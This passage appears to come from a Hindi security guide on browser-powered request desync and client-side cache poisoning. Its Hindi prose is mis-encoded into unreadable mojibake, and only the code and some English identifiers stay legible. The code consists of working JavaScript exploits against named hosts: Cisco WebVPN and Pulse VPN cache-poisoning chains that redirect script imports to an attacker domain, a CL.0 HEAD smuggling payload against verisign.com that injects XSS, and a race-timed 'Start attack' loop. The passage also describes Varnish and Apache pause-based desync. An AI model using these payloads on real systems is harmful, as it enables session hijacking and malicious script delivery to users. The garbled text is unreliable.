рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

### **рд╣реЛрд╕реНрдЯ рд╣реИрдбрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ + рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреИрд╢ рдкреЙрдЗрдЬрдирд┐рдВрдЧ**

* JS рдЙрддреНрдкреАрдбрд╝рди
```javascript
fetch('https://redacted/', {
method: 'POST',
body: "GET /+webvpn+/ HTTP/1.1\r\nHost: x.psres.net\r\nX: Y",
credentials: 'include'}
).catch(() => { location='https://redacted/+CSCOE+/win.js' })
```
* `/+webvpn+/` рдкрд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдЬрд┐рд╕рдореЗрдВ **Host рд╣реИрдбрд░ рдореЗрдВ рдЕрд▓рдЧ рдбреЛрдореЗрди** рд╣реЛрддрд╛ рд╣реИ, `/+webvpn+/index.html` рдкрд░ рдПрдХ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреЗ рд╕рд╛рде рдЙрддреНрддрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬреЛ **Host рд╣реИрдбрд░ рдХреЗ рдбреЛрдореЗрди** рдХреА рдУрд░ рд╣реЛрддрд╛ рд╣реИред
* **рджреВрд╕рд░реЗ** рдЕрдиреБрд░реЛрдз рдореЗрдВ рд╕реНрдерд╛рди `/+CSCOE+/win.js` рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ рдЙрд╕ `.js` рдлрд╝рд╛рдЗрд▓ рдХреЗ **рдХреИрд╢** рдХреЛ **рдкреЙрдЗрдЬрд╝рди** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдЗрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ рдЙрддреНрддрд░ `/+webvpn+/` рдХреЗ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рд╕рд╛рде рджрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рдпрд╣ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рд╣реЛрдЧрд╛ `/+webvpn+/index.html` рдХреЗ рдЖрдХреНрд░рдордХ рдбреЛрдореЗрди рдХреЗ рд╕рд╛рде рд╣реЛрдЧрд╛ред
* **`win.js`** рдХрд╛ **рдХреИрд╢** рдПрдХ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреЗ рд╕рд╛рде **рдкреЙрдЗрдЬрд╝рди** рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдЬреЛ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рдкреЗрдЬ рдХреА рдУрд░ рд╣реЛрдЧрд╛, рд▓реЗрдХрд┐рди рд╡рд┐рдХреНрдЯрд┐рдо рднреА рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд╛ рдкрд╛рд▓рди рдХрд░реЗрдЧрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕реЗ `location` рдЪрд░ рдореЗрдВ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рд╡рд╣ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╡реЗрдм рдкреЗрдЬ рдореЗрдВ рд╕рдорд╛рдкреНрдд рд╣реЛрдЧрд╛ред
* рдлрд┐рд░ рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ `https://redacted/+CSCOE+/logon.html` рдкрд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХрд░реЗрдЧрд╛ред рдЗрд╕ рдкреЗрдЬ рдореЗрдВ `/+CSCOE+/win.js` рдХреЛ рдЖрдпрд╛рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред рдЬрд┐рд╕рдХрд╛ **рдХреИрд╢ рдПрдХ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реЛрддрд╛ рд╣реИ рд╣рдорд▓рд╛рд╡рд░ рдХреЗ рд╕рд░реНрд╡рд░ рдХреА рдУрд░, рдЗрд╕рд▓рд┐рдП рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЦрддрд░рдирд╛рдХ JS рдХреЗ рд╕рд╛рде рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред

**рд╡рд┐рдХреНрдЯрд┐рдо** рджреНрд╡рд╛рд░рд╛ **рд╣рдорд▓рд╛рд╡рд░** рдХреЗ рдкреЗрдЬ рдХрд╛ рджреЛрд╣рд░рд╛ **рдкрд╣реБрдВрдЪ** рд╣реЛрдЧрд╛, рдкрд╣рд▓реЗ рдореЗрдВ рд╡рд╣ рдПрдХ HTML рдХреА **рдЙрдореНрдореАрдж** рдХрд░реЗрдЧрд╛ рдЬреЛ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ `https://redacted/+CSCOE+/logon.html` рдкрд░ рд╡рд╛рдкрд╕ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░реЗрдЧрд╛ рдФрд░ рджреВрд╕рд░реЗ рдореЗрдВ рд╡рд╣ рдЬрд╛рд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЛрдб рдХреА **рдЙрдореНрдореАрдж** рдХрд░реЗрдЧрд╛ (рдкреЗрд▓реЛрдб)ред рдПрдХ рдкреЙрд▓рд┐рдЧреНрд▓реЙрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рджреЛрдиреЛрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛рдПрдБ рдХреЗрд╡рд▓ рдПрдХ рдореЗрдВ рд╕реЗрд╡ рдХреА рдЬрд╛ рд╕рдХреЗрдВ:
```
HTTP/1.1 200 OK
Content-Type: text/html

alert('oh dear')/*<script>location = 'https://redacted/+CSCOE+/logon.html'</script>*/
```
### HEAD рдкреЗрд▓реЛрдб рдЪрдВрдХреНрдб TE рдХреЗ рд╕рд╛рде

CSD рдХреА рддрд▓рд╛рд╢ рдХрд░рддреЗ рд╕рдордп рдЖрдк `/..%2f` рдпрд╛ `/%2f` рдЬреИрд╕реЗ **рдЕрд░реНрдз-рд╡рд┐рдХреГрдд** URL рдХрд╛ рднреА рдкрд░реАрдХреНрд╖рдг рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

* **рд░рдВрдЧреАрди рдЕрдкрд╡рд╛рдж**

![](<../../.gitbook/assets/image (5) (2) (1).png>)

* **JS рдЕрдкрд╡рд╛рдж**
```javascript
fetch('https://www.verisign.com/%2f', {
method: 'POST',
body: `HEAD /assets/languagefiles/AZE.html HTTP/1.1\r\nHost: www.verisign.com\r\nConnection: keep-alive\r\nTransfer-Encoding: chunked\r\n\r\n34d\r\nx`,
credentials: 'include',
headers: {'Content-Type': 'application/x-www-form-urlencoded'
}}).catch(() => {
let form = document.createElement('form')
form.method = 'POST'
form.action = 'https://www.verisign.com/robots.txt'
form.enctype = 'text/plain'
let input = document.createElement('input')
input.name = '0\r\n\r\nGET /<svg/onload=alert(1)> HTTP/1.1\r\nHost: www.verisign.com\r\n\r\nGET /?aaaaaaaaaaaaaaa HTTP/1.1\r\nHost: www.verisign.com\r\n\r\n'
input.value = ''
form.appendChild(input)
document.body.appendChild(form)
form.submit()
}
```
* рдкреГрд╖реНрда **`/%2f`** рддрдХ рдкрд╣реБрдВрдЪрд╛ рдЬрд╛рддрд╛ рд╣реИ рддрд╛рдХрд┐ **CL.0** рдХрдордЬреЛрд░реА рдХрд╛ рд╢реЛрдз рд▓рдЧрд╛рдпрд╛ рдЬрд╛ рд╕рдХреЗред
* рдПрдХ **HEAD** рдЕрдиреБрд░реЛрдз рдХреЛ рдПрдХ **`Transfer-Encoding: chunked` рд╣реИрдбрд░** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЪреЛрд░реА рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред
* рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рдпрд╣ рд╣реИрдбрд░ рдЖрд╡рд╢реНрдпрдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЕрдиреНрдпрдерд╛ **рд╕рд░реНрд╡рд░ рдПрдХ рд╢рд░реАрд░ рд╡рд╛рд▓реЗ HEAD рдЕрдиреБрд░реЛрдз рдХреЛ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рдиреЗ рд╕реЗ рдЗрдирдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ**ред
* рдлрд┐рд░, рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ POST рднреЗрдЬрддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд╢рд░реАрд░ рдореЗрдВ **рдкрд┐рдЫрд▓реЗ HEAD рдЕрдиреБрд░реЛрдз рдХрд╛ рдЕрдВрдд рдЪрдВрдХ** рдФрд░ рдПрдХ **рдирдпрд╛ рдЕрдиреБрд░реЛрдз рдЬреЛ рдЪреЛрд░реА рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ** рд╢рд╛рдорд┐рд▓ рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ **рд╕рд╛рдордЧреНрд░реА** (JS рдкреЗрд▓реЛрдб) рд╣реЛрддреА рд╣реИ рдЬреЛ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдореЗрдВ **рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд** рд╣реЛрдЧреАред
* рдЗрд╕рд▓рд┐рдП рдмреНрд░рд╛рдЙрдЬрд╝рд░ **HEAD** рдЕрдиреБрд░реЛрдз рдХреЛ **POST рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рдХреЗ рд░реВрдк рдореЗрдВ рджреЗрдЦреЗрдЧрд╛ рдЬрд┐рд╕рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдЗрдирдкреБрдЯ рдХреЛ рдкреНрд░рддрд┐рдмрд┐рдВрдмрд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реА **рд╢рд░реАрд░** рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рднреА рд╣реЛрдЧреАред

### рд╣реЛрд╕реНрдЯ рд╣реЗрдбрд░ рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди + RC

* **JS рд╢реЛрд╖рдг**
```html
<script>
function reset() {
fetch('https://vpn.redacted/robots.txt',
{mode: 'no-cors', credentials: 'include'}
).then(() => {
x.location = "https://vpn.redacted/dana-na/meeting/meeting_testjs.cgi?cb="+Date.now()
})
setTimeout(poison, 120) // worked on 140. went down to 110
}

function poison(){
sendPoison()
sendPoison()
sendPoison()
setTimeout(reset, 1000)
}

function sendPoison(){
fetch('https://vpn.redacted/dana-na/css/ds_1234cb049586a32ce264fd67d524d7271e4affc0e377d7aede9db4be17f57fc1.css',
{
method: 'POST',
body: "GET /xdana-na/imgs/footerbg.gif HTTP/1.1\r\nHost: x.psres.net\r\nFoo: '+'a'.repeat(9826)+'\r\nConnection: keep-alive\r\n\r\n",
mode: 'no-cors',
credentials: 'include'
}
)
}

</script>
<a onclick="x = window.open('about:blank'); reset()">Start attack</a>
```
рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдлрд┐рд░ рд╕реЗ, рдПрдХ **рд╣реЛрд╕реНрдЯ рд╣реИрдбрд░** **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ **JS рдЗрдореНрдкреЛрд░реНрдЯ** рдХреЛ **рд╣рд╛рдЗрдЬреИрдХ** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЗрд╕ рдмрд╛рд░ **рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЛ рдХреИрд╢ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛**, рдЗрд╕рд▓рд┐рдП рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб **рдХреИрд╢ рдкреЙрдЗрдЬрд╝рдирд┐рдВрдЧ** рдХреЛрдИ рд╡рд┐рдХрд▓реНрдк рдирд╣реАрдВ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рд╣рдорд╛рд░реЗ рджреНрд╡рд╛рд░рд╛ рдХрд┐рдпрд╛ рдЬрд╛рдиреЗ рд╡рд╛рд▓рд╛ рд╣рдорд▓рд╛ рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ **рдкреАрдбрд╝рд┐рдд рдкреГрд╖реНрда** рдХреЛ рдПрдХ рдЯреИрдм рдореЗрдВ рдПрдХреНрд╕реЗрд╕ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░, рдЬрдм рдкреГрд╖реНрда **JS рдлрд╝рд╛рдЗрд▓ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗ**, рд╕реЙрдХреЗрдЯ **рд╕реНрдордЧрд▓рд┐рдВрдЧ рдХрдиреЗрдХреНрд╢рди** (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ 3) рдХреЛ **рдкреЙрдЗрдЬрд╝рди** рдХрд░реЗрдВред
рдХреНрдпреЛрдВрдХрд┐ **рд╕рдордпрдмрджреНрдзрддрд╛** рдмрд╣реБрдд **рд╕рдЯреАрдХ** рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдП, рд╣рдорд▓рд╛ рд╣рд░ рдмрд╛рд░ рдПрдХ **рдирдИ рдЯреИрдм рдкрд░ рдХрд░реЗрдВ** рдЬрдм рддрдХ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИред

{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ `/meeting_testjs.cgi` рдХреЛ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдПрдХ **404** рдХреЗ рд╕рд╛рде рдЬрд╡рд╛рд╕реНрдХреНрд░рд┐рдкреНрдЯ рд▓реЛрдб рдХрд░рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдЗрд╕реЗ рдХреИрд╢ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЕрдиреНрдп рд╕реНрдерд┐рддрд┐рдпреЛрдВ рдореЗрдВ рдЬрд╣рд╛рдВ рдЖрдк рдПрдХ **рдХреИрд╢ рдХрд┐рдП рдЧрдП JS** рдХреЛ рд╣рдорд▓рд╛ рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░рддреЗ рд╣реИрдВ, рдЖрдкрдХреЛ рдЗрд╕реЗ **рдХреИрд╢ рд╕реЗ рд╣рдЯрдиреЗ** рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдлрд┐рд░ рдПрдХ рдирдпрд╛ рд╣рдорд▓рд╛ рд╢реБрд░реВ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред
{% endhint %}

рд╕рд╛рд░рд╛рдВрд╢ рдХрджрдо:

* рдПрдХ рдирдИ рд╡рд┐рдВрдбреЛ рдЦреЛрд▓реЗрдВред
* рд▓рдХреНрд╖реНрдп рдХреЛ рдПрдХ рддрд╛рдЬрдЧреА рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрд╣рд╛рдирд┐рдХрд╛рд░рдХ рдЕрдиреБрд░реЛрдз рдЬрд╛рд░реА рдХрд░реЗрдВ, рдЬрд┐рд╕рд╕реЗ рд╕рдордпрдмрджреНрдзрддрд╛ рдФрд░ рд╕реБрд╕реНрддреА рдмрдврд╝реЗред
* рд╡рд┐рдВрдбреЛ рдХреЛ рд▓рдХреНрд╖реНрдп рдкреГрд╖реНрда /meeting\_testjs.cgi рдкрд░ рдиреЗрд╡рд┐рдЧреЗрдЯ рдХрд░реЗрдВред
* 120ms рдмрд╛рдж, рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдЧреИрдЬреЗрдЯ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рддреАрди рдкреЙрдЗрдЬрд╝рди рдХрдиреЗрдХреНрд╢рди рдмрдирд╛рдПрдВред
* 5ms рдмрд╛рдж, /meeting\_testjs.cgi рдХреЛ рд░реЗрдВрдбрд░ рдХрд░рддреЗ рд╕рдордп рдкреАрдбрд╝рд┐рдд рд╡реНрдпрдХреНрддрд┐ рдЙрдореНрдореАрджрд╡рд╛рд░рддрд╛ рд╕реЗ /appletRedirect.js рдЗрдореНрдкреЛрд░реНрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдЧрд╛ рдФрд░ рдЙрд╕реЗ x.psres.net рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдЬреЛ рджреБрд╖реНрдЯ JS рд╕рд░реНрд╡ рдХрд░реЗрдЧрд╛ред
* рдпрджрд┐ рдРрд╕рд╛ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рд╣рдорд▓рд╛ рдлрд┐рд░ рд╕реЗ рдХрд░реЗрдВред

## рдкреЙрдЬрд╝-рдЖрдзрд╛рд░рд┐рдд рдбреАрд╕рд┐рдВрдХ <a href="#pause" id="pause"></a>

рдкреЙрдЬрд╝ рдХрд░рдиреЗ рд╕реЗ рдирдИ рдбреАрд╕рд┐рдВрдХ рд╕рдВрднрд╛рд╡рдирд╛рдПрдВ рдмрдирд╛рдИ рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдЬрд┐рд╕рд╕реЗ **рдЧрд▓рдд рдорд╛рдирд╕рд┐рдХ рдЕрдиреБрдорд╛рдирд┐рдд рд╕рдордп-рдЖрдЙрдЯ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди** рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдЗрд╕рд▓рд┐рдП, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ **рд╣реИрдбрд░ рдЗрдВрдЧрд┐рдд рдХрд░рддреЗ рд╣реБрдП рдХрд┐ рдПрдХ рдмреЙрдбреА рд╣реИ**, рдФрд░ рдлрд┐рд░ **рдмреЙрдбреА рднреЗрдЬрдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдлреНрд░рдВрдЯ-рдПрдВрдб рдХрд╛ рд╕рдордп-рдЖрдЙрдЯ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ**ред рдпрджрд┐ рдлреНрд░рдВрдЯ-рдПрдВрдб рд╕рдордп-рдЖрдЙрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди **рдХрдиреЗрдХреНрд╢рди рдЦреБрд▓реА рдЫреЛрдбрд╝ рджреЗрддрд╛ рд╣реИ**, рддреЛ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХрд╛ **рдмреЙрдбреА** рдПрдХ рдирдП рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ **рд╡реНрдпрд╡рд╣рд╛рд░рд┐рдХ** рд╣реЛрдЧрд╛ред

### рдЙрджрд╛рд╣рд░рдг: **рд╡рд╛рд░реНрдирд┐рд╢**

рд╡рд╛рд░реНрдирд┐рд╢ рдХреИрд╢ рдореЗрдВ `synth()` рдирд╛рдордХ рдПрдХ рд╕реБрд╡рд┐рдзрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдХреЗ рджреНрд╡рд╛рд░рд╛ рдЖрдк рдПрдХ рдЕрдиреБрд░реЛрдз рдХреЛ **рдмреИрдХ-рдПрдВрдб рдХреЛ рдлрд╝реЙрд░рд╡рд░реНрдб рдХрд┐рдП рдмрд┐рдирд╛** рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЬрд╛рд░реА** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдирд┐рдпрдо рджрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдПрдХ рдлрд╝реЛрд▓реНрдбрд░ рддрдХ рдкрд╣реБрдВрдЪ рдХреЛ рдмреНрд▓реЙрдХ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ:
```javascript
if (req.url ~ "^/admin") {
return (synth(403, "Forbidden"));
}
```
рдПрдХ **рдЖрдВрд╢рд┐рдХ рдЕрдиреБрд░реЛрдз** рдХреЛ рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рддреЗ рд╕рдордп рдЬрдм рд╡рд░реНрдирд┐рд╢ рдПрдХ рд╕рд┐рдВрде рдирд┐рдпрдо рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдЕрдЧрд░ рдпрд╣ **15 рд╕реЗрдХрдВрдб** рддрдХ рдХреЛрдИ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдирд╣реАрдВ рдХрд░рддрд╛ рд╣реИ рддреЛ рдЯрд╛рдЗрдордЖрдЙрдЯ рд╣реЛ рдЬрд╛рддрд╛ рд╣реИред рдЬрдм рдРрд╕рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдпрд╣ **рдХрдиреЗрдХреНрд╢рди рдЦреЛрд▓реЗ рд░рдЦрддрд╛ рд╣реИ** рддрд╛рдХрд┐ рдЗрд╕реЗ рдкреБрдирдГ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗ, рд╣рд╛рд▓рд╛рдВрдХрд┐ рдЗрд╕рдиреЗ рд╕рд┐рд░реНрдл рд╕реЛрдХреЗрдЯ рд╕реЗ рдЕрд░реНрдзрд╛рдВрд╢ рдЕрдиреБрд░реЛрдз рдкрдврд╝рд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ **рдХреНрд▓рд╛рдЗрдВрдЯ рджреВрд╕рд░рд╛ рдЕрд░реНрдзрд╛рдВрд╢** HTTP рдЕрдиреБрд░реЛрдз рдХреЗ рд╕рд╛рде рдЖрдЧреЗ рдмрдврд╝рддрд╛ рд╣реИ, рддреЛ рдпрд╣ рдПрдХ **рдирдпрд╛ рдЕрдиреБрд░реЛрдз** рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдПрдХ рд╕рдВрдХрдЯрд╛рдкрдиреНрди рдлреНрд░рдВрдЯ-рдПрдВрдб рдкрд░ рдПрдХ рдкреЙрдЬ-рдЖрдзрд╛рд░рд┐рдд рдбрд┐рд╕рд┐рдВрдХ рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЕрдкрдиреЗ рд╣реЗрдбрд░ рднреЗрдЬрдХрд░ рд╢реБрд░реВ рдХрд░реЗрдВ, рдПрдХ рдмреЙрдбреА рдХрд╛ рд╡рд╛рджрд╛ рдХрд░реЗрдВ рдФрд░ рдлрд┐рд░ рдмрд╕ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВред рдЕрдВрддрддрдГ рдЖрдкрдХреЛ рдПрдХ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧреА рдФрд░ рдЬрдм рдЖрдк рдЕрдкрдирд╛ рдЕрдиреБрд░реЛрдз рдмреЙрдбреА рднреЗрдЬреЗрдВрдЧреЗ, рдпрд╣ рдПрдХ рдирдпрд╛ рдЕрдиреБрд░реЛрдз рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛:

![](<../../.gitbook/assets/image (4) (3) (1).png>)

{% hint style="warning" %}
рдЬреИрд╕рд╛ рдХрд┐ рджрд┐рдЦрд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ, рдЗрд╕реЗ 25 рдЬрдирд╡рд░реА рдХреЛ [CVE-2022-23959](https://varnish-cache.org/security/VSV00008.html) рдХреЗ рд░реВрдк рдореЗрдВ рдкреИрдЪ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ред
{% endhint %}

### рдЙрджрд╛рд╣рд░рдг: **рдПрдкрд╛рдЪреА**

рд╡рд░реНрдирд┐рд╢ рдХреА рддрд░рд╣, рдпрд╣ **рд╕рд░реНрд╡рд░ рдЖрд╡реЗрджрди рдХреЛ рд╕рдВрднрд╛рд▓рдиреЗ рдХреА рдмрдЬрд╛рдп рд╕реНрд╡рдпрдВ рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рдВрджрд░реНрднреЛрдВ** рдкрд░ рд╕рдВрдХрдЯрд╛рдкрдиреНрди рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рд╕рд░реНрд╡рд░ рд╕реНрддрд░реАрдп рдкреБрдирд░реНрдирд┐рд░реНрджреЗрд╢рди рдХреЗ рд╕рд╛рде рд╣реЛрддрд╛ рд╣реИ: `Redirect 301 / /en`

### рд╕рд░реНрд╡рд░-рд╕рд╛рдЗрдб рд╢реЛрд╖рдг <a href="#server" id="server"></a>

рдпрджрд┐ рд╕рдВрдХрдЯрд╛рдкрдиреНрди рд╕рд░реНрд╡рд░ (рдПрдкрд╛рдЪреА рдпрд╛ рд╡рд░реНрдирд┐рд╢ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ) рдмреИрдХ-рдПрдВрдб рдореЗрдВ рд╣реИ, рддреЛ рдПрдХ **рдлреНрд░рдВрдЯ-рдПрдВрдб** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреЛ рдЕрдиреБрд░реЛрдз рдХреЛ рдмреИрдХ-рдПрдВрдб рд╕рд░реНрд╡рд░ (рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ HTTP рд╣реЗрдбрд░) рдХреЛ **рдмрдлрд░рд┐рдВрдЧ рдХрд┐рдП рдмрд┐рдирд╛** рд╕реНрдЯреНрд░реАрдо рдХрд░рддрд╛ рд╣реИред

![](<../../.gitbook/assets/image (3) (3).png>)

рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ **рдЬрдм рддрдХ рд╡рд╣ рдмреЙрдбреА рдирд╣реАрдВ рднреЗрдЬрддрд╛ рд╣реИ, рддрдм рддрдХ рдЙрддреНрддрд░ рдЯрд╛рдЗрдордЖрдЙрдЯ рдирд╣реАрдВ рдкреНрд░рд╛рдкреНрдд рд╣реЛрдЧрд╛**ред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЙрд╕реЗ рдЯрд╛рдЗрдордЖрдЙрдЯ рдХрд╛ рдкрддрд╛ рд╣реИ рддреЛ рдпрд╣ рдХреЛрдИ рд╕рдорд╕реНрдпрд╛ рдирд╣реАрдВ рд╣реЛрдиреА рдЪрд╛рд╣рд┐рдПред

